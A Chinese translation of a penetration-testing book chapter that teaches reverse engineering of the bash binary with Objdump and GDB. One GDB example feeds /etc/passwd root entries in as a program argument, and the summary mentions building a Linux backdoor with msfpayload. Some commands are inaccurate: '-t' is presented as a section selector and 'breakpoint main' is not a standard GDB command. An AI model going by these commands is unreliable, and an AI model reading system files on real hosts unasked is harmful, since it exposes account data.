msfpayload 命令就介绍到这里。我们可以继续学习逆向工程工具。

# 反汇编二进制文件

正如本章介绍中所提到的，逆向工程是全面有效的安全研究的一个关键方面。对编译的可执行文件进行反汇编是逆向工程的一个重要方面。

反汇编是尽可能逆转代码编译效果的过程。Kali Linux 提供了一些非常好的工具来协调这个过程；然而，当涉及到命令行上的反汇编时，很少有工具能与 Objdump 媲美。

## 使用 Objdump 进行反汇编

在本节中，我们将学习如何使用 Objdump 及其各种调用选项从**可执行和可链接格式**（**ELF**）二进制文件中剥离出各种信息部分。

### 提示

**关于可执行和可链接格式**

ELF 是 Linux/Unix 系统的可执行文件、共享库、目标文件及其各种衍生物的文件格式。

使用 Objdump 非常简单，但您能否正确使用它取决于您对 ELF 格式的理解程度；因此，我在本章的*进一步阅读*部分中包含了一些非常有用的参考资料，其中详细介绍了格式，建议您查阅。

要对给定的二进制文件进行反汇编——在这里我们将使用 bash shell 可执行二进制文件的示例——您可以执行以下步骤：

1.  我们将使用 bash shell 的实际二进制文件。要获取它的副本，您可以执行以下命令：

```
cp `which bash` ~/. 

```

上述命令将获取 bash shell 的二进制文件的副本——这本书的当前重点。我们将通过 Objdump 来了解更多关于它的工作原理，并详细说明查找解释其执行方式的区域。我们选择在 bash 可执行二进制文件的副本上工作，以防止意外损坏它——毕竟 Kali 默认以 root 身份运行！

1.  调用以下命令在二进制文件上运行 Objdump：

```
objdump –D bash

```

这个命令的作用是提供`-D`选项，告诉 Objdump 对二进制文件进行反汇编并将其打印到屏幕上。您应该看到如下截图所示的输出：

![使用 Objdump 进行反汇编](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_10.jpg)

这就是你需要做的一切，以便 Objdump 对二进制文件进行反汇编。尽管乐趣并不止于此，可执行二进制文件有许多部分，每个部分都专门详细说明了可执行行为的某个部分。Objdump 有许多选项，每个选项都专门用于从二进制文件中提取各种信息。

如果您像我们在示例中那样调用 Objdump，您可能会看到输出的这部分，如下截图所示：

![使用 Objdump 进行反汇编](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_22.jpg)

输出详细说明了给定二进制文件中可用的部分；不过，如果您只想查看给定部分的代码，您应该使用以下选项：

```
objdump –t [section name] –D [binary]

```

例如，如果您想转储`.text`部分的代码，您可以使用以下命令：

```
objdump –t .text –D [binary]

```

对于我们当前的示例，它将产生类似于以下截图的输出：

![使用 Objdump 进行反汇编](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_11.jpg)

Objdump 有许多选项可供选择。我在*进一步阅读*部分添加了一些有用的链接，供那些想了解更多的人使用。

## 关于逆向工程汇编代码的说明

所以，就 Objdump 而言，我们已经基本涵盖了基础知识。然而，如果我不提一点关于你需要了解的关于二进制文件的东西，那就对不起你了，这是成为成功的逆向工程师所必须的。

在关于 Objdump 的上一节中，我们学习了如何提取关于`.text`段的信息。ELF 的`.text`段包含可执行代码。这个部分通常包含关于二进制行为的信息，这通常是逆向工程师感兴趣的。ELF 中的可执行代码用汇编语言表示，为了理解`.text`段中的信息，您需要在一定程度上理解汇编代码。

汇编代码是语义上描述机器代码的语言，而机器代码是字节和位的集合，它们实际上控制着你的 CPU 和内存——我们称之为软件。因此，汇编代码代表了运行您的机器的实际代码，而不是 C、C++、Java 等代码是在其中开发的。这是因为计算机实际上没有计算能力来理解 C、C++或任何其他高级语言，我们开发的语言必须依赖编译器来解析和翻译这些语言，将其转换为更基本的、原子的语言，然后才能执行。汇编语言严格地描述了软件计算与 CPU 寄存器和内存之间的交互，反之亦然。这是基于一组简单的操作：加法、减法、异或、值的比较等等。

每个 CPU，或者说架构，都以其独特的格式表示这些指令。这些格式称为指令，并可以根据一组基本属性进行分类。广义上，它们被分为**精简指令集计算机**（**RISC**）或**复杂指令集计算**（**CISC**）。然后，每个 RISC 和 CISC 指令集根据可以从内存移动到寄存器的最大数据量进行定义，这称为寄存器大小。我相信你们中的一些人对 32 位或 x86 和 64 位或 x86-64 机器已经很熟悉了。

如果你有一些编程经验，你就会知道当代码执行时，几乎总是在函数的上下文中执行。这意味着翻译成汇编语言的大部分代码将描述在函数内设置执行并将执行转移到另一个函数的过程。每个指令集和架构都有一个特定的标准，定义了在 CPU 寄存器和涉及的操作方面如何完成这个过程。这个标准被称为过程调用函数。我在*进一步阅读*部分中包含了一些 ARM、Intel 和 MIPS 架构的过程调用标准，除非你想花几周时间阅读有关汇编语言的内容，而你实际上并不需要这样做，我建议你查看这些参考资料。

话虽如此，我们可以继续使用 GDB 对二进制文件进行动态分析。

# 动态分析二进制文件

诸如 Objdump 之类的工具非常适合在可执行文件不执行时查看代码。然而，如果你想实际观察可执行文件的执行并了解它如何处理信息以及它的内部数据结构如何被执行改变，你将需要一种称为调试器的工具。其中一种工具称为**GNU 调试器**（**GDB**）。在本节中，我们将介绍 GDB 的基本用法，你也将了解到它允许我们在二进制文件执行期间执行哪些任务。

## 使用 GDB 入门

首先，让我们加载一个二进制文件并在 GDB 中运行它，使用以下命令：

```
gdb [binary]

```

对于我们当前的例子，这个命令看起来像这样：

```
gdb ./bash

```

GDB 在这里所做的是准备在二进制文件执行期间附加到它自身——这意味着它将二进制文件放置在一个特殊的环境中，允许它在执行期间观察详细信息。它还尝试从提供的文件中读取调试信息，这是一组帮助更语义地描述程序以进行测试的信息。不幸的是，像我们的例子中一样，bash 并没有使用调试标志进行编译。这意味着没有关于对象的语义元数据，比如变量名、源代码到汇编代码的映射等，供 GDB 使用，你只能使用低级的汇编代码。然而，对于一个决心的逆向工程师来说，这并不是死路。

一旦二进制文件加载完成，我们要做的第一件事就是在 GDB 中运行程序。在`gdb`提示符中使用以下命令：

```
(gdb) run

```

你应该在屏幕上看到以下内容：

![使用 GDB 入门](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_12.jpg)

GDB 和大多数调试程序的操作方式是，它们允许您在程序的可执行代码中指定一个停止点或者说断点。这使您可以停止程序并检查其数据结构以获取信息。一旦程序达到断点，GDB 允许您对程序执行许多操作。您可以检查 CPU 寄存器的值，或者在程序执行期间可用于此程序的 CPU 寄存器内容的副本。您还可以检查内存的值，打印出局部和全局变量，检查堆栈，并执行大量其他任务。我们将介绍最基本的内容，以便让您开始并向您展示如何获取有关 GDB 功能的更多信息。

您还可以使用`run`命令将参数传递给您当前正在研究的可执行文件。命令如下：

```
(gdb) run [arguments list]

```

例如，考虑以下命令：

```
(gdb) run Hello World

```

前面的命令将把字符串`Hello`和`World`作为参数传递给当前可执行文件。您还应该知道，`run`命令与 bash 命令行处理器完全集成，因此您可以使用 bash 的完整规范，命令替换，重定向和管道通过`run`命令传递参数。以下是一个典型的例子：

```
(gdb) run `cat /etc/passwd | awk –F\: '/^root/ { print $0 }'`

```

前面的命令将传递一个参数，该参数包含`/etc/passwd`文件中以单词`root`开头的所有行作为当前可执行文件的参数。

## 设置执行断点和监视点

因此，继续进行，您可能希望在使用 GDB 进行逆向工程时的某个时刻设置断点，但在这样做之前，我们需要找到要设置断点的地址。

在本例中，我们将使用`main`函数中的第一个地址，该地址在程序启动时立即执行。在这样做之前，我们需要找出这个地址，您可以使用以下命令来执行：

```
(gdb) breakpoint main

```

前面的命令将获取执行名为`main`的函数中的第一个地址。如果您想要在`main`函数中的任意地址设置断点，您需要在代码中进行一些调查。要找出`main`函数中可用的地址，执行以下命令：

```
(gdb) disassemble main

```

前面的命令告诉 GDB 反汇编给定可执行文件的`main`函数。这通常是开发人员编写的与给定可执行文件特定的所有代码的起点。您应该看到类似以下截图出现在屏幕上：

![设置执行断点和监视点](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_13.jpg)

在上面的截图中，我们可以看到正在使用`disass`命令，它是`disassemble`命令的缩写。它执行与`disassemble`命令相同的功能。

上面的截图显示了 GDB 如何反汇编`main`函数。我们感兴趣的是`main`函数的第一个地址。为了简化操作，我们将模拟在前面的示例中执行的`main`断点命令的行为。您要查找的地址是列出的第一个地址；在本例中，它将是地址`0x0806dc0`。这里以十六进制格式列出地址。如果您不习惯使用十六进制数字，您应该尽快学习它们的工作原理；大多数逆向工程师可能更多地以十六进制阅读而不是以母语阅读！

出于兴趣，您可能已经猜到 Objdump 应该为您提供有关启动`main`函数的地址的相同信息。以下截图显示了 Objdump 关于 main 函数起始点的信息：

![设置执行断点和监视点](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_14.jpg)

Objdump 似乎同意 GDB 关于`main`函数的起始地址。这是因为可执行文件的`.text`部分被映射到静态和预定的集合地址；也就是说，`.text`部分将始终可靠地出现在`.text`部分中详细说明的地址中。

所以，现在您想要做的是设置此地址的断点，作为断点的简单演示。要执行此操作，请在 GDB 提示符中输入以下命令：

```
(gdb) breakpoint * [main start address]

```

对于我们的示例，此命令将按以下方式工作：

```
(gdb) breakpoint * 0x0806dc0

```

上一个命令应该产生以下输出：

![设置执行断点和监视点](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_15.jpg)

您还可以使用断点命令的简写形式，操作如下：

```
(gdb) b [function name]

```

否则，您可以使用以下命令指定特定的内存地址，如下所示：

```
(gdb) b * [address]

```

除了设置断点，根据指令指针的值中断和停止二进制文件的执行之外，您还可以使用监视点中断执行。以下命令显示了如何为给定变量设置监视点：

```
(gdb) watch –l [variable name]

```

使用变量的地址，您可以按以下方式执行：

```
(gdb) watch –l * [address]

```

在我们当前的示例中，我们可以为堆栈指针的顶部设置一个监视点，即在`main`开始执行时保存的 ESP 中的值：

![设置执行断点和监视点](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_16.jpg)

如果我们重新运行可执行文件，监视点将触发如下：

![设置执行断点和监视点](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_17.jpg)

## 检查寄存器、内存值和运行时信息

一旦您掌握了在二进制文件中停止的位置——也就是在函数或代码中特定行或一旦变量根据给定条件更改其值时停止——您可能希望开始查看可执行文件的数据结构和内存内容。在我们刚刚讨论的示例基础上，让我们看一下第一个断点命中后保存的寄存器值。以下命令显示了如何执行此操作：

```
(gdb) info registers

```

上一个命令应该产生以下输出：

![检查寄存器、内存值和运行时信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_18.jpg)

您还可以打印当前堆栈跟踪，即关于哪个函数是当前函数的调用者以及在调用期间传递了哪些参数的信息，以及调用者的调用者和调用者的调用者等等。

以下是当前堆栈跟踪的示例：

```
(gdb) info stack

```

上一个命令应该产生以下输出：

![检查寄存器、内存值和运行时信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_19.jpg)

您还可以使用以下命令查看堆栈的实际内容：

```
(gdb) x/5x $esp

```

在这里，我们使用了称为 x 的瑞士军刀，它可以打印内存值。它在 GDB 提示符中用于以各种格式打印可执行文件中的内存、局部变量和其他信息存储区域中的值。例如，x 能够以十进制、十六进制、八进制和二进制格式打印值，并将数据转换为指令，以便它可以打印存储在给定内存地址处的可执行指令列表。我们在这里所做的是给`x`一个参数`/5x`，这意味着：

> 以十六进制格式打印 5 个地址值—用'x'表示。

要了解有关`x`的更多信息，请在 GDB 提示符中执行`help x`命令。

无论如何，上一个命令应该产生以下输出：

![检查寄存器、内存值和运行时信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_20.jpg)

如果您想要估计执行时当前实例的堆栈大小，可以执行以下命令：

```
(gdb) set $count =  ( $ebp - $esp ) / 4
(gdb) eval "x/%dx $esp", $count

```

根据您在程序执行期间执行这些命令的时间，上述命令将在屏幕上打印以下内容：

![检查寄存器、内存值和运行时信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_21.jpg)

您可以使用`eval`命令基于变量值构建命令，以便用于任何目的。在这里，我们使用此命令计算了保存在 ESP 寄存器中的堆栈指针值的顶部和保存在 EBP 寄存器中的堆栈指针底部的地址之间的差异。我们还将此值除以`4`，以计算打印整个堆栈所需的地址数量。

接下来，还有许多其他运行时分析工具和功能。有关这些功能的更多信息，请在 GDB 提示符中执行以下命令：

```
(gdb) info

```

这将列出并描述您可以执行的信息类型函数。要了解有关 GDB 任何功能的更多信息，可以使用`help`函数，如下所示：

```
(gdb) help

```

这就结束了 GDB 的基本用法。希望您已经学会了足够的知识，使其成为逆向工程和渗透测试中的有用工具。

# 总结

在本章中，我们介绍了在 Kali Linux 中可用的基于命令行的逆向工程和通用应用程序专注的利用工具，并详细介绍了如何将它们与一些非常有用的 bash 脚本集成。

更具体地说，我们学会了使用 Metasploit 命令行界面。我们还介绍了 Metasploit Frameworks 基于命令行的有效负载生成器，并且举例说明了如何为 Linux 32 位机器构建后门。最后，我们看了 Objdump 和 GDB 这两个逆向工程工具。我们使用 Objdump 详细说明了可执行文件的各个部分，并查找了给定函数的地址。我们的例子是查找`main`。使用 GDB，我们介绍了设置断点、设置监视点，并且不仅可以在执行之前从二进制文件中获取有用信息，还可以在执行期间通过转储堆栈、寄存器值以及跟踪一些内存值的变化来获取有用信息。

希望这些工具在您需要打开应用程序并找出其全部内容时会派上用场。有关本章中涵盖的工具以及一些重要的支持技术信息，请参阅*进一步阅读*部分中的链接。

# 进一步阅读

+   关于 Metasploit Meterpreter，您可以在[`www.offensive-security.com/metasploit-unleashed/About_Meterpreter`](http://www.offensive-security.com/metasploit-unleashed/About_Meterpreter)找到更多信息

+   有关 Metasploit 的 Meterpreter，请转到[`projetsecubd.googlecode.com/svn-history/r17/trunk/Documents/meterpreter.pdf`](https://projetsecubd.googlecode.com/svn-history/r17/trunk/Documents/meterpreter.pdf)

+   有关 Meterpreter 基础知识，请转到[`www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics`](http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics)

+   有关 MSFCLI 的更多信息，请访问[`www.offensive-security.com/metasploit-unleashed/Msfcli`](http://www.offensive-security.com/metasploit-unleashed/Msfcli)

+   您可以在[`www.gnu.org/software/gdb/documentation/`](http://www.gnu.org/software/gdb/documentation/)阅读 GNU GDB 文档。

+   您可以在[`wiki.osdev.org/ELF`](http://wiki.osdev.org/ELF)阅读可执行和可链接格式

+   有关 ELF 对象文件格式：简介，请转到[`www.linuxjournal.com/article/1059`](http://www.linuxjournal.com/article/1059)

+   要了解有关 DWARF 调试信息格式修订 2.2.0 的更多信息，请转到[`www.dwarfstd.org/doc/dwarf-2.0.0.pdf`](http://www.dwarfstd.org/doc/dwarf-2.0.0.pdf)

+   有关 Objdump 命令参考的详细信息，请转到[`sourceware.org/binutils/docs/binutils/objdump.html#objdump`](https://sourceware.org/binutils/docs/binutils/objdump.html#objdump)

+   您可以在[`software.intel.com/sites/default/files/m/d/4/1/d/8/Introduction_to_x64_Assembly.pdf`](https://software.intel.com/sites/default/files/m/d/4/1/d/8/Introduction_to_x64_Assembly.pdf)阅读英特尔的 x64 汇编简介

+   此外，您还可以在英特尔的《英特尔体系结构软件开发人员手册第 2 卷》中找到[`www.cs.cmu.edu/~410/doc/intel-isr.pdf`](https://www.cs.cmu.edu/~410/doc/intel-isr.pdf)

+   ARM-THUMB 过程调用标准可以在[`www.cs.cornell.edu/courses/cs414/2001fa/armcallconvention.pdf`](http://www.cs.cornell.edu/courses/cs414/2001fa/armcallconvention.pdf%20)找到

+   ARM 过程调用标准-ARM 可以在[`infocenter.arm.com/help/topic/com.arm.doc.ihi0042e/IHI0042E_aapcs.pdf`](http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042e/IHI0042E_aapcs.pdf)找到

+   您还可以在苹果开发者网站上阅读更多关于 iOS ABI 函数调用指南的信息，网址为[`developer.apple.com/library/ios/documentation/Xcode/Conceptual/iPhoneOSABIReference/Introduction/Introduction.html`](https://developer.apple.com/library/ios/documentation/Xcode/Conceptual/iPhoneOSABIReference/Introduction/Introduction.html)

+   Dennis Yurichev 的《逆向工程入门》可以在[`yurichev.com/writings/RE_for_beginners-en.pdf`](http://yurichev.com/writings/RE_for_beginners-en.pdf)找到
